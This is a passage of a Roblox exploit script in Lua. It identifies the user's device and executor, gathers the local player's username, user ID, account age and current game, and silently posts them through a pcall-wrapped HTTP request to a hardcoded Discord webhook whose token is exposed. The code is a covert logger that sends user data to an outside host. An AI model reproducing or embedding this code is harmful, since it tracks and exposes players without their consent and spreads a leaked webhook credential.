        return "Desktop" --Detects if user is Desktop
    end
end
----------
local function getexploit() -- Detects What the user Executor is
    local exploit =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
        (isexecutorclosure and "Script-Ware OR fluxus") or
        (secure_load and "Sentinel") or
        (is_sirhurt_closure and "SirHurt V4") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "Krnl") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getreg()["CalamariLuaEnv"] and "Calamari") or
        (unit and "Unit") or
        ("Undetected Prolly some Ass executor")
    return exploit
end
local webh = "https://discord.com/api/webhooks/1080359853077299292/riGKKi7_uVeFrBZeQdj7k_mc9igA6wSwuln4NaVHwrUZZwe2A-n0i1ipXxPqR2LLTKwN"

pcall(
    function()
        --Setting up the main Data embeds etc
        local data = {
            ["embeds"] = {
                {
                    ["title"] = "-----------------",
                    ["description"] = "User executed! Here are the logs:",
                    ["fields"] = {
                        {name = "Username", value = game:GetService("Players").LocalPlayer.Name},
                        {name = "DisplayName", value = game:GetService("Players").LocalPlayer.DisplayName},
                        {name = "User ID", value = game:GetService("Players").LocalPlayer.UserId},
                        {name = "Account Age", value = game:GetService("Players").LocalPlayer.AccountAge},
                        {name = "Game ID", value = game.PlaceId},
                        {
                            name = "Game Name",
                            value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
                        },
                        {name = "Device type", value = getplatform()},
                        {name = "Exploit", value = getexploit()}
                    }
                }
            }
        }
        --Webhook set up/post
        if syn then
            local response =
                syn.request(
                {
                    Url = webh,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode(data)
                }
            )
        elseif request then
            local response =
                request(
                {
                    Url = webh,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode(data)
                }
            )
        elseif http_request then
            local response =
                http_request(
                {
                    Url = webh,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode(data)
                }
            )
        end
    end
)
